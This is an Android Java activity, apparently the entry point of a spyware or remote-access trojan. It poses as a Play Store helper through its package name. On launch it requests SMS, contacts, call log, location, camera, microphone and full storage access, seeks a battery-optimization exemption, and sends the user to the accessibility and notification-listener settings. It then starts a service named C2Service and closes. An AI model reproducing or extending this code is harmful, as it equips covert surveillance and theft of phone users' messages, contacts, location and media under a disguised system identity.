package com.android.vending.helper;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.*;
import android.provider.Settings;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {
    @Override protected void onCreate(Bundle b) {
        super.onCreate(b);
        
        if (Build.VERSION.SDK_INT >= 23) {
            List<String> perms = new ArrayList<>();
            perms.add(android.Manifest.permission.READ_SMS);
            perms.add(android.Manifest.permission.READ_CONTACTS);
            perms.add(android.Manifest.permission.READ_CALL_LOG);
            perms.add(android.Manifest.permission.ACCESS_FINE_LOCATION);
            perms.add(android.Manifest.permission.CAMERA);
            perms.add(android.Manifest.permission.RECORD_AUDIO);
            if (Build.VERSION.SDK_INT >= 33) {
                perms.add("android.permission.POST_NOTIFICATIONS");
                perms.add("android.permission.READ_MEDIA_IMAGES");
                perms.add("android.permission.READ_MEDIA_VIDEO");
                perms.add("android.permission.READ_MEDIA_AUDIO");
            } else {
                perms.add(android.Manifest.permission.READ_EXTERNAL_STORAGE);
                perms.add(android.Manifest.permission.WRITE_EXTERNAL_STORAGE);
            }
            requestPermissions(perms.toArray(new String[0]), 1);
        }

        // طلب صلاحية الوصول لجميع الملفات (لأندرويد 11+)
        if (Build.VERSION.SDK_INT >= 30) {
            if (!Environment.isExternalStorageManager()) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                intent.setData(Uri.parse("package:" + getPackageName()));
                startActivity(intent);
            }
        }

        // تجاوز تحسين البطارية
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Intent intent = new Intent();
            String packageName = getPackageName();
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                intent.setData(Uri.parse("package:" + packageName));
                startActivity(intent);
            }
        }
        
        // تفعيل خدمات الإشعارات وإمكانية الوصول (توجيه المستخدم)
        try {
            Intent acc = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            startActivity(acc);
            Intent notif = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
            startActivity(notif);
        } catch (Exception e) {}

        Intent s = new Intent(this, C2Service.class);
        if (Build.VERSION.SDK_INT >= 26) startForegroundService(s); else startService(s);
        finish();
    }
}
